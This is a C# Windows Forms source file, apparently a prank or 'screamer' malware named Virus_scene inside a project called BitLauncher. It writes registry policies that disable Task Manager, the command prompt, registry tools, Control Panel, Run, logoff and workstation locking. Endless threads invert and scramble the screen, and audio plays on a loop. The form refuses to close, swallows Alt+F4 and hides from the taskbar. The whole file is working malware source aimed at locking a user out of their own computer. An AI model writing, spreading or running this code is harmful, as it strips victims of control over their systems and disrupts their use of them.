using System.Runtime.InteropServices;
using Microsoft.Win32;
using System;
using System.Media;

namespace BitLauncher
{
    public partial class Virus_scene : Form
    {
        static bool stopThreads = false;
        private SoundPlayer player;
        private string musicFileName = "melody.wav";
        public Virus_scene()
        {
            InitializeMusicPlayer();
            InitializeComponent();
            BlockUtilities();
            this.FormBorderStyle = FormBorderStyle.None;
            Thread invThread = new Thread(InvertScreen);
            Thread rgbThread = new Thread(RGBQuadEffect);
            invThread.Start();
            rgbThread.Start();
            while (true)
            {
                Screem screem_scene = new Screem();
                Bad_Picture screem_e = new Bad_Picture();
                screem_e.Show();
                Task.Delay(10000);
                MessageBox.Show("Hey! What's up lol :)");
                Task.Delay(10000);
                screem_e.Hide();
                Task.Delay(10000);
                screem_scene.Show();
                Task.Delay(10000);
                screem_e.Show();
                Task.Delay(10000);
                screem_e.Hide();
                Task.Delay(10000);
                screem_scene.Hide();
                Task.Delay(10000);
            }
        }

        private void InitializeMusicPlayer()
        {
            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string musicFilePath = System.IO.Path.Combine(currentDirectory, musicFileName);

            player = new SoundPlayer(musicFilePath);
            player.LoadCompleted += (s, e) =>
            {
                player.PlayLooping();
            };

            player.PlayLooping();
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint nPlanes, uint nBitCount, IntPtr lpBits);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);

        [DllImport("gdi32.dll")]
        private static extern bool GetBitmapBits(IntPtr hbmp, int cbBuffer, byte[] lpvBits);

        [DllImport("gdi32.dll")]
        private static extern bool SetBitmapBits(IntPtr hbmp, int cbBuffer, byte[] lpvBits);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        private const int SRCCOPY = 0x00CC0020;
        private const int NOTSRCCOPY = 0x00330008;

        private static ulong n, r;

        private static int Randy()
        {
            n = r;
            n ^= 0x8ebf635bee3c6d25;
            n ^= (n << 5) | (n >> 26);
            n *= 0xf3e05ca5c43e376b;
            r = n;
            return (int)(n & 0x7fffffff);
        }

        private void InvertScreen()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, NOTSRCCOPY);
                Thread.Sleep(5);
            }

            ReleaseDC(IntPtr.Zero, hdc);
        }

        private void RGBQuadEffect()
        {
            int time = Environment.TickCount;
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            byte[] data = new byte[w * h * 4];
            IntPtr desk = GetDC(IntPtr.Zero);

            while (true)
            {
                IntPtr hdcdc = CreateCompatibleDC(desk);
                IntPtr hbm = CreateBitmap(w, h, 1, 32, IntPtr.Zero);
                IntPtr oldBitmap = SelectObject(hdcdc, hbm);

                BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
                GetBitmapBits(hbm, w * h * 4, data);

                int v = 0;
                byte byteVal = 0;
                if ((Environment.TickCount - time) > 60000)
                    byteVal = (byte)(Randy() % 0xff);

                for (int i = 0; i < w * h; i++)
                {
                    int index = i * 4;

                    if (i % w == 0 && Randy() % 100 == 0)
                        v = Randy() % 50;

                    int offset = (i + v) * 4;
                    if (offset < data.Length)
                    {
                        data[index + (v % 3)] += (byte)(data[offset + v % 4] ^ byteVal);
                    }
                }

                SetBitmapBits(hbm, w * h * 4, data);
                BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);

                SelectObject(hdcdc, oldBitmap);
                DeleteObject(hbm);
                DeleteObject(hdcdc);
                ReleaseDC(IntPtr.Zero, desk);

                Thread.Sleep(100);
            }
        }

        public static void BlockUtilities()
        {
            try
            {
                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1);

                SetRegistryValue(@"Software\Policies\Microsoft\Windows\System", "DisableCMD", 1);

                SetRegistryValue(@"Software\Policies\Microsoft\Windows\System", "DisableRegistryTools", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewOnDrive", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSecurityTab", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFileMenu", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoCommonGroups", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoLogOff", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", "NoChangingWallpaper", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetTaskbar", 1);

                SetRegistryValue(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableLockWorkstation", 1);

                //Console.WriteLine("Системные утилиты и функции заблокированы.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Ошибка: " + ex.Message);
            }
        }

        private static void SetRegistryValue(string keyPath, string valueName, object value)
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                key.SetValue(valueName, value);
            }
        }

        void Screemers()
        {

        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // Отключаем Alt+F4
            if (keyData == (Keys.Alt | Keys.F4))
            {
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                const int WS_EX_NOACTIVATE = 0x08000000;
                const int WS_EX_APPWINDOW = 0x00040000;

                var cp = base.CreateParams;
                cp.ExStyle |= WS_EX_NOACTIVATE;
                cp.ExStyle &= ~WS_EX_APPWINDOW;

                return cp;
            }
        }

        private void Virus_scene_Load(object sender, EventArgs e)
        {

        }

        private void Virus_scene_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void Virus_scene_Load_1(object sender, EventArgs e)
        {

        }
    }
}
